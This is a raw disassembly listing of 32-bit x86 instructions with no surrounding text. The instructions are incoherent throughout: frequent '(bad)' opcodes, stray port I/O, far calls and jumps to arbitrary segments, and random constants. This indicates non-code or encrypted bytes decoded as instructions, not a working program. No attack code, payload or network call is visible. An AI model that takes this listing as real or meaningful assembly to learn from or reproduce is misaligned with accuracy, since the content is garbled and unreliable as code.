  414e5f:	imul   ebp,DWORD PTR [ebp+0x4389bd8e],0x7b
  414e66:	sub    al,0x2e
  414e68:	clc    
  414e69:	scas   al,BYTE PTR es:[edi]
  414e6a:	(bad)  
  414e6c:	outs   dx,BYTE PTR ds:[esi]
  414e6d:	sbb    eax,0xbdc2a02e
  414e72:	mov    dh,BYTE PTR [ebp+0x62]
  414e75:	lahf   
  414e76:	xor    DWORD PTR [ebp-0x3d938890],esi
  414e7c:	js     0x414e4f
  414e7e:	cmp    DWORD PTR [esi+edi*8+0x2e],edi
  414e82:	rcl    BYTE PTR [eax+0x3d1498c3],0x84
  414e89:	js     0x414ed9
  414e8b:	outs   dx,BYTE PTR ds:[esi]
  414e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e8d:	imul   ebp,DWORD PTR [eax-0x78],0x99ecb4a0
  414e94:	fwait
  414e95:	and    bl,BYTE PTR [eax-0x36]
  414e98:	fs scas eax,DWORD PTR es:[edi]
  414e9a:	or     eax,0xb3a32051
  414e9f:	xor    BYTE PTR [edi+0x301d85e2],cl
  414ea5:	sbb    DWORD PTR ds:0x3cc39726,0x5c
  414eac:	ins    BYTE PTR es:[edi],dx
  414ead:	je     0x414f02
  414eaf:	and    DWORD PTR [eax-0x6a],0x198609fb
  414eb6:	or     al,0x9d
  414eb8:	mov    ebp,0xc97fc7b0
  414ebd:	(bad)  
  414ebe:	cwde   
  414ebf:	cmp    ebp,esi
  414ec1:	jne    0x414ef4
  414ec3:	out    dx,al
  414ec4:	dec    ecx
  414ec5:	add    al,0xb
  414ec7:	add    eax,0x1d9499bf
  414ecc:	psubd  mm2,QWORD PTR [eax+0xe0c4ad7]
  414ed3:	pop    edi
  414ed4:	adc    eax,0xe2c4f023
  414ed9:	pop    ecx
  414eda:	add    dh,bh
  414edc:	add    edx,0xac1fce13
  414ee2:	hlt    
  414ee3:	inc    edx
  414ee4:	push   ebp
  414ee5:	pop    eax
  414ee6:	inc    ebp
  414ee7:	or     eax,0xa926dba0
  414eec:	in     eax,dx
  414eed:	xor    BYTE PTR [ebp+0x5],0x50
  414ef1:	inc    ebp
  414ef2:	add    al,BYTE PTR [esi-0x24a5bace]
  414ef8:	in     eax,0xbf
  414efa:	enter  0x49ea,0xc3
  414efe:	retf   
  414eff:	and    edx,ebx
  414f01:	push   ebp
  414f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f04:	xor    al,0x2d
  414f06:	int3   
  414f07:	cs ret 
  414f09:	push   esp
  414f0a:	(bad)  
  414f0b:	sbb    al,0x14
  414f0d:	sar    dh,1
  414f0f:	mov    al,ds:0x0
	...
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x9d6ff4b8
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	fiadd  WORD PTR [esi-0x42ef5b06]
  414f92:	mov    dh,0xf8
  414f94:	push   ds
  414f95:	std    
  414f96:	jae    0x414fdc
  414f98:	mov    ebp,DWORD PTR [ecx]
  414f9a:	jg     0x414ffa
  414f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f9d:	push   ebp
  414f9e:	das    
  414f9f:	cmp    BYTE PTR [edx+0x7d997b2],bl
  414fa5:	mov    cl,0xb5
  414fa7:	test   al,0x7f
  414fa9:	sub    eax,0xf19f7f59
  414fae:	popf   
  414faf:	shr    BYTE PTR [edi-0x727de947],1
  414fb5:	xor    al,0x39
  414fb7:	repz add edx,eax
  414fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fbb:	int3   
  414fbc:	loopne 0x41501d
  414fbe:	gs popf 
  414fc0:	cwde   
  414fc1:	out    0xc,al
  414fc3:	pop    ecx
  414fc4:	mov    esp,0x15d58d31
  414fc9:	sbb    esp,0xacae9927
  414fcf:	cmp    edi,esp
  414fd1:	shl    DWORD PTR [ebx+0x55],0x7c
  414fd5:	cmp    BYTE PTR [edi+0x41],al
  414fd8:	push   ecx
  414fd9:	push   ecx
  414fda:	call   0x50009d40
  414fdf:	and    DWORD PTR [ebx-0x4e53f507],esi
  414fe5:	je     0x415039
  414fe7:	sbb    edi,ecx
  414fe9:	aad    0x2c
  414feb:	push   ebp
  414fec:	leave  
  414fed:	imul   DWORD PTR [ebx]
  414fef:	push   ebx
  414ff0:	adc    edx,DWORD PTR fs:[eax+0x2ab1281e]
  414ff7:	loop   0x414fdf
  414ff9:	jns    0x415021
  414ffb:	dec    esp
  414ffc:	loop   0x414f8f
  414ffe:	fwait
  414fff:	xor    eax,0x8c30f86d
  415004:	call   0xdda3:0xaf93be67
  41500b:	push   es
  41500c:	jle    0x41504f
  41500e:	adc    BYTE PTR [ecx],ah
  415010:	loop   0x415075
  415012:	add    eax,0xa4d7dbc9
  415017:	mov    bl,0xc6
  415019:	ret    0x95c9
  41501c:	jmp    0xf6a370c1
  415021:	xor    bl,dh
  415023:	sub    dl,BYTE PTR [esi]
  415025:	pcmpgtd mm3,QWORD PTR [edi+0x10484537]
  41502c:	fisubr WORD PTR [eax+eax*2+0x1e298cc4]
  415033:	aas    
  415034:	test   eax,0x808bd0ef
  415039:	test   al,0x50
  41503b:	aad    0x8e
  41503d:	(bad)  
  41503e:	call   0x39d26fa0
  415043:	test   al,bh
  415045:	test   al,0xb7
  415047:	inc    esp
  415048:	scas   eax,DWORD PTR es:[edi]
  415049:	fld    DWORD PTR [ebp+0x618b4c5d]
  41504f:	(bad)  
  415050:	mov    ecx,0x6557915e
  415055:	mov    dl,0xb9
  415057:	aas    
  415058:	call   0xd0b5:0x994ecf31
  41505f:	ds aam 0x11
  415062:	ss inc eax
  415064:	into   
  415065:	and    eax,DWORD PTR [esi-0x6f]
  415068:	mov    dl,0xb
  41506a:	in     al,dx
  41506b:	jle    0x414ff1
  41506d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41506e:	push   ecx
  41506f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415070:	push   edx
  415071:	sbb    bl,BYTE PTR [ebx-0x4e9d05bb]
  415077:	pop    ecx
  415078:	mov    eax,0xd11e0ba6
  41507d:	daa    
  41507e:	sub    ah,dl
  415080:	fdiv   st(3),st
  415082:	pop    es
  415083:	inc    ecx
  415084:	and    ebp,ecx
  415086:	xor    eax,0xeaf862f3
  41508b:	cli    
  41508c:	and    bl,BYTE PTR [ebp+0x94a2]
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xb2afc2d
  415102:	inc    ecx
  415103:	or     DWORD PTR [esi+ebx*8],0x1040000
  41510a:	add    BYTE PTR [eax],al
  41510c:	leave  
  41510d:	mov    ds:0xc0c9f181,eax
  415112:	pop    ebp
  415113:	in     eax,dx
  415114:	or     edx,ebp
  415116:	cs pop ebp
  415118:	ja     0x4150a7
  41511a:	mov    ah,0x41
  41511c:	ffree  st(7)
  41511e:	inc    ebx
  41511f:	pop    ebp
  415120:	cmp    eax,0xed958717
  415125:	(bad)  
  415127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415128:	in     eax,dx
  415129:	sbb    DWORD PTR [esi*4-0x6fc50f96],esi
  415130:	call   0x9a6c2c2
  415135:	fld    TBYTE PTR [ebx]
  415137:	xor    ebx,0x22
  41513a:	div    ebp
  41513c:	xchg   ebx,eax
  41513d:	adc    DWORD PTR [eax],esp
  41513f:	and    al,0xdc
  415141:	aad    0x9f
  415143:	dec    edi
  415144:	test   al,0xbe
  415146:	(bad)  
  415147:	retf   
  415148:	jge    0x4150e2
  41514a:	xor    ebp,DWORD PTR [edi-0x34]
  41514d:	push   cs
  41514e:	jp     0x4151c1
  415150:	repz dec ebx
  415152:	into   
  415153:	arpl   WORD PTR [edx-0x6a],bx
  415156:	xor    ah,BYTE PTR [edx-0x4c0573a4]
  41515c:	es retf 0xffe6
  415160:	jecxz  0x415191
  415162:	mov    al,ds:0xbc77ff3f
  415167:	mov    ch,0x68
  415169:	leave  
  41516a:	xchg   edx,eax
  41516b:	mov    bl,0x6b
  41516d:	sbb    eax,0xa8e3d562
  415172:	add    DWORD PTR [ebx-0x2],edx
  415175:	cmp    BYTE PTR [ebx-0x2e],0x8c
  415179:	fs push 0x45
  41517c:	sbb    eax,0x6539fb83
  415181:	dec    eax
  415182:	loop   0x4151a6
  415184:	and    dl,BYTE PTR [eax]
  415186:	and    al,0xd0
  415188:	stos   DWORD PTR es:[edi],eax
  415189:	arpl   WORD PTR [edx-0x2095c15f],bp
  41518f:	mov    ecx,0x4878f315
  415194:	xchg   edi,eax
  415195:	ins    DWORD PTR es:[edi],dx
  415196:	scas   eax,DWORD PTR es:[edi]
  415197:	je     0x41511d
  415199:	outs   dx,DWORD PTR ds:[esi]
  41519a:	pop    ebp
  41519b:	pop    esp
  41519c:	lods   al,BYTE PTR ds:[esi]
  41519d:	fidivr DWORD PTR [ecx+0x37]
  4151a0:	pop    esp
  4151a1:	push   esi
  4151a2:	call   DWORD PTR [esi+0x64]
  4151a5:	test   BYTE PTR [ecx-0x2c8b612],bl
  4151ab:	jle    0x4151b1
  4151ad:	and    BYTE PTR [edi],0xd2
  4151b0:	push   ebx
  4151b1:	inc    ebp
  4151b2:	mov    dl,0xda
  4151b4:	sub    esi,DWORD PTR [ebp+0x4332f3f4]
  4151ba:	fist   DWORD PTR [esi]
  4151bc:	int    0xf4
  4151be:	sbb    DWORD PTR [edi-0x1510a85a],edx
  4151c4:	(bad)  
  4151c6:	data16 in al,0xe3
  4151c9:	inc    esi
  4151ca:	cmp    eax,0x3b30411f
  4151cf:	and    dl,BYTE PTR [ebp+0x6cc2b726]
  4151d5:	ror    DWORD PTR [ebp-0x4aaf7ed9],0x4c
  4151dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151dd:	inc    ebx
  4151de:	push   eax
  4151df:	leave  
  4151e0:	sbb    eax,0x3c981fb0
  4151e5:	jg     0x4151d8
  4151e7:	inc    BYTE PTR [esi]
  4151e9:	cmp    ch,ah
  4151eb:	mov    ds:0x39b13757,eax
  4151f0:	add    ah,BYTE PTR [ebp+0x6a]
  4151f3:	mov    eax,0x6606f493
  4151f8:	scas   eax,DWORD PTR es:[edi]
  4151f9:	arpl   WORD PTR [eax-0x35],ax
  4151fc:	call   DWORD PTR [edi]
  4151fe:	mov    ah,0x9d
  415200:	push   es
  415201:	xchg   ecx,eax
  415202:	push   ebp
  415203:	enter  0x44f,0x13
  415207:	xchg   ebp,eax
  415208:	push   ebx
  415209:	clc    
  41520a:	mov    dh,0x3
  41520c:	cld    
  41520d:	mov    dh,BYTE PTR [edi+0xa1]
	...
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x10c6930b
  415283:	pop    ds
  415284:	adc    bh,bl
  415286:	add    BYTE PTR [eax],al
  415288:	add    al,0x1
  41528a:	add    BYTE PTR [eax],al
  41528c:	repnz scas eax,DWORD PTR es:[edi]
  41528e:	fild   WORD PTR [ecx-0x58c866ac]
  415294:	mov    eax,ds:0xe1437d0d
  415299:	mov    eax,0xc9acd483
  41529e:	std    
  41529f:	jle    0x415314
  4152a1:	or     al,0x2b
  4152a3:	adc    edx,ebp
  4152a5:	pop    ebp
  4152a6:	dec    ebp
  4152a7:	mov    al,0xab
  4152a9:	cmp    eax,0xa8b87c73
  4152ae:	push   cs
  4152af:	outs   dx,BYTE PTR ds:[esi]
  4152b0:	cmp    DWORD PTR [eax-0x5d],esp
  4152b3:	lea    ebx,[ebp-0x4b]
  4152b6:	pop    edx
  4152b7:	sbb    eax,0xca1ba562
  4152bc:	and    ebx,DWORD PTR [ebp-0x76]
  4152bf:	inc    edi
  4152c0:	scas   eax,DWORD PTR es:[edi]
  4152c1:	call   0x982e:0xbc387f34
  4152c8:	mov    dh,0xe1
  4152ca:	sub    DWORD PTR [ecx-0x8],esp
  4152cd:	push   ebp
  4152ce:	xor    ch,bh
  4152d0:	push   cs
  4152d1:	inc    ebx
  4152d2:	sbb    ah,ah
  4152d4:	mov    edx,0x7c2dd474
  4152d9:	and    DWORD PTR [ebp+0x68],edx
  4152dc:	imul   ebp,DWORD PTR [edx],0x52725370
  4152e2:	or     dh,dl
  4152e4:	imul   eax,DWORD PTR [ebx+0x28],0xffffffb1
  4152e8:	lods   eax,DWORD PTR ds:[esi]
  4152e9:	or     al,0xdf
  4152eb:	mov    ?,esp
  4152ed:	adc    ch,bl
  4152ef:	imul   ecx,edx,0xffffffe2
  4152f2:	push   es
  4152f3:	fild   WORD PTR [eax-0x769c098e]
  4152f9:	mov    ah,0x3c
  4152fb:	xor    ah,al
  4152fd:	out    dx,al
  4152fe:	jo     0x41533c
  415300:	cmc    
  415301:	ss push ss
  415303:	cmp    eax,0x2c685b5d
  415308:	xor    edx,ecx
  41530a:	cdq    
  41530b:	cmp    edx,ebp
  41530d:	popa   
  41530e:	sub    al,0x86
  415310:	sbb    al,ah
  415312:	xor    edx,DWORD PTR [edi-0x4a]
  415315:	ja     0x41532c
  415317:	aas    
  415318:	xchg   ebp,eax
  415319:	jo     0x41529d
  41531b:	cmp    esp,edx
  41531d:	enter  0x310a,0x67
  415321:	cmp    al,0xc4
  415323:	adc    ecx,DWORD PTR [edx+ebx*1+0x21326858]
  41532a:	mov    esp,0x4982536f
  41532f:	dec    esp
  415330:	inc    ebx
  415331:	or     BYTE PTR [eax+0x73],ah
  415334:	push   esp
  415335:	cmovle edi,DWORD PTR [ebx-0x4]
  415339:	into   
  41533a:	add    BYTE PTR [edx-0x36eebda8],0x92
  415341:	(bad)  
  415342:	int    0xbd
  415344:	dec    ebp
  415345:	add    BYTE PTR [edx+0x1],cl
  415348:	push   ebp
  415349:	pop    ecx
  41534a:	js     0x4152db
  41534c:	mov    ebx,0xb2864b63
  415351:	(bad)  
  415352:	jmp    0xa6d5:0xe9dedc4f
  415359:	rcr    DWORD PTR [edi+0x51944196],cl
  41535f:	jo     0x41534c
  415361:	jge    0x415315
  415363:	retf   0x2b97
  415366:	adc    ah,BYTE PTR [esi+eax*4]
  415369:	inc    eax
  41536a:	pusha  
  41536b:	sbb    edi,0x45
  41536e:	idiv   BYTE PTR [eax+0x4ad54ff1]
  415374:	cmp    al,0x8b
  415376:	dec    esi
  415377:	clc    
  415378:	mov    ebx,0x36cf274a
  41537d:	push   0xaf1338f9
  415382:	das    
  415383:	xor    BYTE PTR [esi-0x5a23e813],0xf7
  41538a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41538b:	xchg   ecx,eax
  41538c:	hlt    
  41538d:	sub    dh,ah
  41538f:	adc    eax,0x0
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x38d3e5b0
  415401:	stos   BYTE PTR es:[edi],al
  415402:	pop    ebx
  415403:	mov    DWORD PTR [eax+eiz*8],edx
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	test   eax,0x45cd2fe3
  415411:	shr    BYTE PTR [ebp+0x2ccc76a8],1
  415417:	add    DWORD PTR [ebp-0x5e],eax
  41541a:	(bad)  
  41541c:	jge    0x4153c1
  41541e:	gs push esp
  415420:	or     BYTE PTR [ebp+0x44],ch
  415423:	cmp    ch,BYTE PTR [edi]
  415425:	mov    eax,0x39badf24
  41542a:	out    dx,eax
  41542b:	adc    dh,bl
  41542d:	test   BYTE PTR [esi-0xba67baa],bh
  415433:	mov    dh,0xd9
  415435:	dec    ebx
  415436:	call   0xeba160fe
  41543b:	mov    ?,WORD PTR [edx-0x117228e6]
  415441:	fidivr DWORD PTR [ebp-0x53]
  415444:	dec    ebx
  415445:	rcr    BYTE PTR [edi+ebp*2-0xa],0xdc
  41544a:	or     ecx,DWORD PTR [ecx]
  41544c:	pushf  
  41544d:	or     ebx,edx
  41544f:	int3   
  415450:	data16 mov al,ds:0x6b6802ab
  415456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415457:	add    DWORD PTR [esi],edi
  415459:	mov    al,0xf5
  41545b:	jmp    0xe169c0d0
  415460:	repnz xchg edi,eax
  415462:	xchg   esp,eax
  415463:	jbe    0x415437
  415465:	leave  
  415466:	neg    bl
  415468:	mov    eax,0xf399db77
  41546d:	adc    edi,DWORD PTR [eax+0x58]
  415470:	sbb    BYTE PTR [edi+0x595aa5d3],ch
  415476:	mov    BYTE PTR [ecx],dh
  415478:	ins    BYTE PTR es:[edi],dx
  415479:	js     0x41548a
  41547b:	aas    
  41547c:	(bad)  
  41547d:	pop    edx
  41547e:	es xchg esi,eax
  415480:	test   eax,0x9a65d56
  415485:	outs   dx,BYTE PTR ds:[esi]
  415486:	xchg   DWORD PTR [edi-0x7c130e16],ebp
  41548c:	ret    0x86e2
  41548f:	or     al,0x93
  415491:	clc    
  415492:	mov    ds:0xfb744025,eax
  415497:	cdq    
  415498:	lods   al,BYTE PTR ds:[esi]
  415499:	aaa    
  41549a:	jg     0x41544b
  41549c:	mov    bl,0xa3
  41549e:	mov    ebp,0xb901d874
  4154a3:	pop    edx
  4154a4:	push   ecx
  4154a5:	adc    al,bh
  4154a7:	jnp    0x415429
  4154a9:	out    dx,al
  4154aa:	sbb    BYTE PTR [eax-0x33],bl
  4154ad:	into   
  4154ae:	nop
  4154af:	cmp    ah,BYTE PTR [eax-0x4d]
  4154b2:	or     edx,DWORD PTR [esi]
  4154b4:	aam    0xe6
  4154b6:	jno    0x4154fd
  4154b8:	dec    esp
  4154b9:	out    0x24,al
  4154bb:	sub    esi,DWORD PTR [esi+0x41]
  4154be:	popa   
  4154bf:	ss xor al,0x1b
  4154c2:	push   esp
  4154c3:	enter  0xf32d,0x73
  4154c7:	pop    ds
  4154c8:	(bad)  
  4154c9:	aas    
  4154ca:	push   esp
  4154cb:	push   edi
  4154cc:	cdq    
  4154cd:	jg     0x4154bf
  4154cf:	mov    al,0x76
  4154d1:	mov    edx,0x60648018
  4154d6:	xchg   BYTE PTR [esi-0x97566cd],ah
  4154dc:	in     al,dx
  4154dd:	fwait
  4154de:	into   
  4154df:	pop    ecx
  4154e0:	lods   eax,DWORD PTR ds:[esi]
  4154e1:	push   eax
  4154e2:	add    ch,ch
  4154e4:	loope  0x4154a0
  4154e6:	fiadd  DWORD PTR [edx-0x47e7225f]
  4154ec:	sahf   
  4154ed:	ror    DWORD PTR [edi+ebx*8],cl
  4154f0:	sub    eax,0x21e19438
  4154f5:	add    esp,DWORD PTR [eax]
  4154f7:	dec    ebp
  4154f8:	(bad)  [edx+eax*2-0x5ce1ffbe]
  4154ff:	fpatan 
  415501:	popf   
  415502:	out    dx,al
  415503:	jl     0x415498
  415505:	aas    
  415506:	cmc    
  415507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415508:	pop    ss
  415509:	sbb    ah,BYTE PTR [edx+0x5cf3feb0]
  41550f:	mov    esp,0x0
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x41551c
  415581:	xor    eax,DWORD PTR [edi-0x7]
  415584:	sbb    cl,ah
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	out    0xd,eax
  41558e:	lea    ebx,[edi+edi*1]
  415591:	xchg   ebp,eax
  415592:	adc    ah,BYTE PTR [esi-0x1389324]
  415598:	js     0x4155ae
  41559a:	cmp    al,0x31
  41559c:	(bad)  
  41559d:	rol    BYTE PTR [esi],1
  41559f:	div    BYTE PTR [eax]
  4155a1:	adc    edx,DWORD PTR ds:0x8e71515a
  4155a7:	retf   
  4155a8:	push   0x59efb69a
  4155ad:	(bad)  
  4155ae:	xor    BYTE PTR gs:[edi+0x64c99d7b],ah
  4155b5:	adc    eax,0xa91f1025
  4155ba:	xor    eax,0x37e4665a
  4155bf:	cld    
  4155c0:	add    al,0x2b
  4155c2:	jae    0x4155d1
  4155c4:	ins    BYTE PTR es:[edi],dx
  4155c5:	dec    ecx
  4155c6:	xchg   BYTE PTR gs:[esi+0x25cdb085],dl
  4155cd:	cmc    
  4155ce:	hlt    
  4155cf:	push   0xffffffdb
  4155d1:	idiv   BYTE PTR [edx+0x29]
  4155d4:	std    
  4155d5:	fwait
  4155d6:	(bad)  
  4155d8:	imul   esi,DWORD PTR [eax-0x39],0xffffffae
  4155dc:	icebp  
  4155dd:	cmp    esi,esp
  4155df:	fidivr WORD PTR [ebx+esi*4+0x52ffb4ea]
  4155e6:	push   ecx
  4155e7:	aas    
  4155e8:	jae    0x41565c
  4155ea:	jbe    0x41563a
  4155ec:	arpl   cx,ax
  4155ee:	(bad)  
  4155ef:	or     BYTE PTR ds:[ecx],al
  4155f2:	add    BYTE PTR [edi],ch
  4155f4:	jl     0x415576
  4155f6:	fcmovnu st,st(7)
  4155f8:	xor    BYTE PTR [eax-0x22e8b5a8],0xfe
  4155ff:	nop
  415600:	push   cs
  415601:	push   es
  415602:	test   eax,0x44de5859
  415607:	sub    al,BYTE PTR [eax+0x42]
  41560a:	mov    ebp,0xb4c936ea
  41560f:	mov    ebx,0x135e0993
  415614:	data16 aad 0xc7
  415617:	stos   DWORD PTR es:[edi],eax
  415618:	int3   
  415619:	cmp    eax,0xbe7a2584
  41561e:	daa    
  41561f:	repz sbb DWORD PTR [eax],ebx
  415622:	adc    al,0x84
  415624:	stos   BYTE PTR es:[edi],al
  415625:	ss out dx,al
  415627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415628:	shl    BYTE PTR [edx+0x1dccc773],0x84
  41562f:	jge    0x4155db
  415631:	pop    esp
  415632:	iret   
  415633:	pop    ebp
  415634:	les    esi,FWORD PTR [ecx]
  415636:	mov    bl,0xa
  415638:	xchg   bh,cl
  41563a:	cdq    
  41563b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41563c:	xlat   BYTE PTR ds:[ebx]
  41563d:	dec    edx
  41563e:	std    
  41563f:	xchg   esi,eax
  415640:	cmp    DWORD PTR [edx+0x5bd249af],ebp
  415646:	inc    ebp
  415647:	scas   al,BYTE PTR es:[edi]
  415648:	push   ss
  415649:	push   edx
  41564a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41564b:	ds push 0x7faf54e0
  415651:	sub    dh,BYTE PTR ds:0x9f96b23e
  415657:	push   ss
  415658:	sub    al,0x4c
  41565a:	mov    WORD PTR [ebp-0x3d963221],ss
  415660:	add    DWORD PTR [eax+0x1ff0bfaf],ecx
  415666:	or     al,0x99
  415668:	in     al,0x32
  41566a:	in     al,dx
  41566b:	sbb    DWORD PTR [esi-0x63aefce3],esi
  415671:	lds    esi,FWORD PTR [esi]
  415673:	fnstcw WORD PTR [esi]
  415675:	xor    BYTE PTR [esi-0x6a3acc64],ch
  41567b:	pop    es
  41567c:	sbb    ah,BYTE PTR [ebx-0x63]
  41567f:	mov    ecx,DWORD PTR [ebp+0x1269143c]
  415685:	sub    DWORD PTR [ebx],esp
  415687:	add    ebx,DWORD PTR [ecx+eiz*8-0xb894f75]
  41568e:	pop    ebp
  41568f:	stc    
	...
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x6e
  415701:	jae    0x4156b2
  415703:	sbb    eax,0xe21c
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	mov    BYTE PTR [esi+0x43],bh
  41570f:	push   ebx
  415710:	push   ebx
  415711:	mov    edx,0xb0fa389
  415716:	adc    ax,0xc13e
  41571a:	sub    BYTE PTR [ebp+ebp*8-0x2b],dh
  41571e:	unpcklps xmm2,XMMWORD PTR [edi+0x3b7f847f]
  415725:	push   edi
  415726:	out    dx,al
  415727:	dec    eax
  415728:	sub    edx,DWORD PTR [esp+ebp*2-0x15711ece]
  41572f:	xor    BYTE PTR [edx],bh
  415731:	outs   dx,BYTE PTR ds:[esi]
  415732:	popf   
  415733:	push   eax
  415734:	push   edi
  415735:	mov    ebp,0xce067b7f
  41573a:	cwde   
  41573b:	mov    al,0xe7
  41573d:	pusha  
  41573e:	sahf   
  41573f:	push   ds
  415740:	push   ebp
  415741:	adc    BYTE PTR [ecx-0x6b],ch
  415744:	cmc    
  415745:	mov    ah,0x47
  415747:	retf   
  415748:	repz popa 
  41574a:	ins    DWORD PTR es:[edi],dx
  41574b:	lahf   
  41574c:	les    bp,DWORD PTR [esi+ebp*4]
  415750:	adc    eax,0xdb13cd1c
  415755:	sbb    BYTE PTR [esi+edi*8],bh
  415758:	cmp    eax,0x6b93c6fc
  41575d:	mov    eax,ds:0x58a65f7d
  415762:	jge    0x4157d1
  415764:	(bad)  
  415765:	ud2    
  415767:	jmp    0x415763
  415769:	in     al,dx
  41576a:	mov    eax,0x9504de05
  41576f:	fld    st(3)
  415771:	addr16 pop es
  415773:	(bad)  
  415774:	dec    eax
  415775:	mov    BYTE PTR [esi-0xcb203f8],bh
  41577b:	adc    DWORD PTR ds:0x4882965e,edi
  415781:	mov    eax,0x53fdb3e1
  415786:	sub    al,0x97
  415788:	or     DWORD PTR [edi+0x526687cd],0x70d9c1b9
  415792:	xor    esp,DWORD PTR [ecx-0x56]
  415795:	enter  0x7568,0x3a
  415799:	not    DWORD PTR [ecx]
  41579b:	cmp    DWORD PTR [ecx],ecx
  41579d:	fldenv [esi-0x74]
  4157a0:	aad    0xbb
  4157a2:	push   0x18
  4157a4:	outs   dx,BYTE PTR ds:[esi]
  4157a5:	mov    cl,BYTE PTR [edx+edx*2+0x3419b0f3]
  4157ac:	dec    esp
  4157ad:	or     ah,BYTE PTR [esi+0x1c]
  4157b0:	lahf   
  4157b1:	shl    bl,1
  4157b3:	sub    ebp,ebx
  4157b5:	inc    esp
  4157b6:	ficomp WORD PTR [ecx]
  4157b8:	fdiv   QWORD PTR [ebp-0xc]
  4157bb:	mov    ebp,0x93b80fa7
  4157c0:	clc    
  4157c1:	(bad)  [eax-0x23]
  4157c4:	push   0x194c1b3f
  4157c9:	push   esi
  4157ca:	xchg   esp,eax
  4157cb:	outs   dx,DWORD PTR ds:[esi]
  4157cc:	cmp    al,0xbd
  4157ce:	sub    DWORD PTR [edx],esp
  4157d0:	push   es
  4157d1:	add    ebx,ecx
  4157d3:	call   0x32357a8a
  4157d8:	xchg   edx,eax
  4157d9:	leave  
  4157da:	cs push ebp
  4157dc:	jecxz  0x41582f
  4157de:	in     eax,0xeb
  4157e0:	jmp    0x415777
  4157e2:	mov    dh,0x82
  4157e4:	push   ecx
  4157e5:	and    ebp,edx
  4157e7:	mov    dh,0xe1
  4157e9:	daa    
  4157ea:	loop   0x41578d
  4157ec:	add    DWORD PTR [ecx+0x293a0b0b],eax
  4157f2:	ret    
  4157f3:	add    DWORD PTR [ebx-0x730e2f3a],0x63ecbec9
  4157fd:	add    eax,0xa7152901
  415802:	(bad)  
  415803:	stos   BYTE PTR es:[edi],al
  415804:	jge    0x41579a
  415806:	add    eax,0x405f63d6
  41580b:	xchg   ebp,eax
  41580c:	(bad)  
  41580d:	dec    ebx
  41580e:	mov    eax,ds:0xe0
	...
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rol    DWORD PTR [ebp+0x2f],cl
  415882:	or     edi,DWORD PTR [ebx+0xe320]
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	frstor [edi-0xa5f1b2d]
  415892:	aaa    
  415893:	adc    BYTE PTR [edx-0x76],0x2e
  415897:	pop    edi
  415898:	mov    BYTE PTR ds:[ebx+0x6e002d64],ch
  41589f:	or     al,0x3
  4158a1:	dec    edi
  4158a2:	xor    DWORD PTR [edi],eax
  4158a4:	imul   ebx,ecx,0x2ae2d333
  4158aa:	shl    BYTE PTR [esi],cl
  4158ac:	mov    edx,0xa22bcda5
  4158b1:	mov    DWORD PTR [edi+eax*4],esp
  4158b4:	xor    DWORD PTR [eax],ecx
  4158b6:	(bad)  
  4158b7:	icebp  
  4158b8:	arpl   WORD PTR gs:[eax],bx
  4158bb:	jb     0x4158a3
  4158bd:	cld    
  4158be:	mov    esp,0xa5733b50
  4158c3:	hlt    
  4158c4:	lock sti 
  4158c6:	add    ecx,edi
  4158c8:	add    BYTE PTR [edi+edx*2-0x1a],ch
  4158cc:	xor    BYTE PTR [ebp+0x78a386b5],ch
  4158d2:	jmp    0x4987:0x5d8f0e2a
  4158d9:	mov    bl,0xc1
  4158db:	push   ss
  4158dc:	retf   
  4158dd:	fldcw  WORD PTR [ebp-0x46]
  4158e0:	push   eax
  4158e1:	outs   dx,DWORD PTR ds:[esi]
  4158e2:	ret    0x2755
  4158e5:	fsubrp st(7),st
  4158e7:	jne    0x4158cd
  4158e9:	xchg   DWORD PTR [eax+0x24992a8d],esi
  4158ef:	cmp    eax,0xbb1747a5
  4158f4:	imul   esi,DWORD PTR [ebp-0x3],0x9b3cc7be
  4158fb:	enter  0x7431,0x67
